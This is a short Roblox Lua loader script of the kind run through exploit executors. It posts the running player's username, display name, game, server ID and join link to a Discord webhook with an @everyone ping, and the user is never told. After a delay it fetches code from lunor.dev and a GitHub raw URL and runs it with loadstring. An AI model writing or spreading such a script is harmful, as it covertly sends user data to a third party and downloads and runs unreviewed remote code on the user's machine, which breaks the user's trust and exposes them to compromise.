-- Your Discord webhook URL
local WEBHOOK_URL = "https://discord.com/api/webhooks/XXXXXXXXX/XXXXXXXXX"

-- Delay before scripts start (change this number only)
local DELAY = 10

-- Function to send an embed to Discord
local function sendEmbed(title, description, color)
    local data = {
        content = "@everyone", -- Pings everyone
        embeds = {{
            title = title,
            description = description,
            color = color,
            footer = { text = "Loader Notification" },
            timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
        }}
    }

    local jsonData = game:GetService("HttpService"):JSONEncode(data)
    local request = request or http_request or syn.request or http.request
    if request then
        request({
            Url = WEBHOOK_URL,
            Method = "POST",
            Headers = {["Content-Type"] = "application/json"},
            Body = jsonData
        })
    else
        warn("No HTTP request function available in this environment.")
    end
end

-- Safe loader function
local function safeLoad(url)
    local success, result = pcall(function()
        return loadstring(game:HttpGet(url))()
    end)
    if not success then
        warn("Failed to load script from:", url, "\nError:", result)
    end
end

-- Main
task.spawn(function()
    -- Get player info
    local player = game.Players.LocalPlayer
    local username = player and player.Name or "Unknown"
    local displayName = player and player.DisplayName or "Unknown"

    -- Game info
    local placeId = game.PlaceId
    local jobId = game.JobId
    local placeName = game:GetService("MarketplaceService"):GetProductInfo(placeId).Name

    -- Universal join link (PC + Mobile)
    local joinLink = ("[Click to Join](https://www.roblox.com/games/start?placeId=%d&gameInstanceId=%s)"):format(placeId, jobId)

    -- Build webhook description
    local description = string.format(
        "✅ **Script executed by:** %s (`%s`)\n🎮 **Game:** %s\n📌 **Place ID:** %d\n🔗 **Join Link:** %s\n🖥️ **Server Code:** %s\n⏳ Loader starting in %d seconds...",
        displayName,
        username,
        placeName,
        placeId,
        joinLink,
        jobId,
        DELAY
    )

    -- Send webhook
    sendEmbed("🚀 Loader Pending", description, 0xFFFF00) -- Yellow

    -- Wait before running loaders
    wait(DELAY)

    -- Load scripts
    safeLoad("https://lunor.dev/loader")
    safeLoad("https://raw.githubusercontent.com/Lunorhubb/LunorScript/refs/heads/main/Loader.lua")
end)
